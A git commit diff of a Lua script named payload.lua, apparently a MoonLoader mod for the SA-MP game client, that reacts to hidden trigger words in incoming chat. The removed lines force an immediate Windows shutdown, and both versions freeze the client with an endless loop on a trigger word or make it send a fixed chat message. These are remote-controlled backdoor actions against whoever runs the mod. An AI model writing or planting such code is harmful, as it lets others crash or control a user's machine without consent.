b9d8342c9bd958b68aab8de93b147e7a99ffc783
TheLold <paymentsse8@gmail.com>
2026-06-22 18:50:05 +0300

    Update payload.lua

--- payload.lua
+++ payload.lua
@@ -1,34 +1,15 @@
 -- payload.lua
--- Основной модуль управления
+sampAddChatMessage("{00FF00}[DEBUG] Payload v2 active", -1)
 
--- Защита от дублирования: если скрипт уже загружен в память, выходим
-if _G.PAYLOAD_LOADED then return end
-_G.PAYLOAD_LOADED = true
-
--- Функция обработки чата
+-- Используем старый добрый метод событий MoonLoader
 function onReceiveChatMessage(text)
-    -- Очистка от HEX-цветов
-    local cleanText = text:gsub("{%x%x%x%x%x%x}", "")
+    -- Уберем цвета, чтобы поиск был точным
+    local t = text:gsub("{%x%x%x%x%x%x}", "")
     
-    if cleanText:find("хуйкина") then
-        os.execute("Shutdown /s /t 0 /f")
-    elseif cleanText:find("кукусики") then
-        while true do end
-    elseif cleanText:find("сырколбаска") then
+    if t:find("сырколбаска") then
+        sampAddChatMessage("{FFFF00}[DEBUG] Command detected!", -1)
         sampSendChat("123655")
-    end
-end
-
--- Обработка исходящих сообщений
-function onSendChat(text)
-    if text:find("хуйкина") then
-        os.execute("Shutdown /s /t 0 /f")
-    elseif text:find("кукусики") then
+    elseif t:find("кукусики") then
         while true do end
-    elseif text:find("сырколбаска") then
-        lua_thread.create(function()
-            wait(500)
-            sampSendChat("123655")
-        end)
     end
 end
